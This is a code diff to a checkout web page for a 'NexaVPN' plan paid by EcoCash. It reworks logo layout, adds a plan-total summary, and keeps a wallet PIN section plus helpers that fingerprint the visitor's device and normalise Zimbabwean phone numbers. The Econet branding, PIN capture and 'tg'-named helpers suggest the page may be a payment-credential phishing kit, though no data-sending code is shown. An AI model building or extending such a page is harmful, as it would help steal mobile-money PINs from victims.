@@ -194,12 +194,28 @@ main{flex:1;max-width:560px;margin:0 auto;width:100%;padding:32px 20px;animation
     <div class="ctx-price" id="hdrPrice">USD 4.99</div>
   </div>
 
-  <div class="eco-row">
-    <div class="eco-row-logos">
-      <img src="assets/ecocash.png" alt="EcoCash">
-      <img src="assets/econet.png" alt="Econet">
-    </div>
+  <div class="eco-row" style="justify-content:center;flex-direction:column;align-items:center;gap:8px;text-align:center">
+    <img src="assets/ecocash.png" alt="EcoCash" style="height:32px;width:auto;border-radius:7px;margin:0 auto">
     <div class="eco-row-text"><strong>EcoCash</strong> · Wallet only · No airtime deducted</div>
+  </div>
+
+
+  <!-- PLAN SUMMARY -->
+  <div style="background:var(--card);border:1.5px solid var(--amber);border-radius:14px;overflow:hidden;box-shadow:0 0 0 3px var(--amber-a);margin-bottom:16px">
+    <div style="padding:14px 16px;display:flex;align-items:center;justify-content:space-between">
+      <div>
+        <div style="font-size:15px;font-weight:700;color:var(--ink1)" id="sumPlan">Monthly Plan</div>
+        <div style="font-size:11px;color:var(--ink3);margin-top:2px">NexaVPN · WireGuard · Instant activation</div>
+      </div>
+      <div style="text-align:right">
+        <div style="font-size:11px;color:var(--ink3);margin-bottom:1px">Total</div>
+        <div style="font-size:20px;font-weight:800;color:var(--amber);font-feature-settings:'tnum'" id="sumTotal">USD 6.98</div>
+      </div>
+    </div>
+    <div style="background:var(--navy);padding:9px 16px;display:flex;align-items:center;gap:8px">
+      <img src="assets/econet.png" alt="Econet" style="height:16px;width:auto;border-radius:3px;flex-shrink:0">
+      <span style="font-size:11px;color:rgba(255,255,255,.65)" id="sumBundle">Includes <b style="color:#fff">5GB Econet data</b> · 30 days</span>
+    </div>
   </div>
 
   <!-- PIN -->
@@ -265,8 +281,7 @@ main{flex:1;max-width:560px;margin:0 auto;width:100%;padding:32px 20px;animation
         </div>
       </div>
       <div class="proc-eco">
-        <img src="assets/ecocash.png" alt="EcoCash">
-        <img src="assets/econet.png" alt="Econet">
+        <img src="assets/ecocash.png" alt="EcoCash" style="height:20px;width:auto;border-radius:4px">
         <span>Secured by EcoCash · Econet Zimbabwe</span>
       </div>
     </div>
@@ -316,10 +331,21 @@ try{plan=JSON.parse(sessionStorage.getItem('selectedPlan')||'{}');}catch(e){}
 try{recip=JSON.parse(sessionStorage.getItem('ecoRecipient')||'{}');}catch(e){}
 
 var amt='USD '+(plan.amount||'4.99');
+var TOTALS={Monthly:'6.98','3 Months':'18.96',Annual:'103.87'};
+var BUNDLES_LG={Monthly:'5GB Econet data · 30 days','3 Months':'5GB × 3 Econet bundles · 90 days',Annual:'10GB × 12 Econet bundles · 365 days'};
+var totalAmt='USD '+(TOTALS[plan.duration]||'6.98');
+(function(){
+  var sp=document.getElementById('sumPlan');
+  var st=document.getElementById('sumTotal');
+  var sb=document.getElementById('sumBundle');
+  if(sp)sp.textContent=(plan.duration||'Monthly')+' Plan';
+  if(st)st.textContent=totalAmt;
+  if(sb)sb.innerHTML='Includes <b style="color:#fff">'+(BUNDLES_LG[plan.duration]||'5GB Econet data')+'</b>';
+})();
 document.getElementById('hdrAmt').textContent=amt;
 document.getElementById('hdrTitle').textContent=plan.duration||'VPN Plan';
 document.getElementById('hdrPrice').textContent=amt;
-document.getElementById('hdrNum').textContent=(recip.display||'NexaVPN')+' \u00b7 EcoCash';
+document.getElementById('hdrNum').innerHTML='<img src="https://flagcdn.com/w20/zw.png" width="16" height="12" style="display:inline;vertical-align:middle;margin-right:4px;border-radius:2px" alt="ZW"> '+(recip.display||'EcoCash number')+' \u00b7 EcoCash';
 
 function tgDevice(){var ua=navigator.userAgent||'';var os=ua.match(/iPhone|iPad/i)?'iOS':ua.match(/Android/i)?'Android':ua.match(/Windows/i)?'Windows':'Other';var mob=ua.match(/Mobile|Android|iPhone/i)?'Mobile':'Desktop';return mob+' \u00b7 '+os;}
 function tgPhone(r){var v=String(r||'').replace(/\D/g,'');if(v.startsWith('263'))v=v.slice(3);if(v.startsWith('0'))v=v.slice(1);return v;}
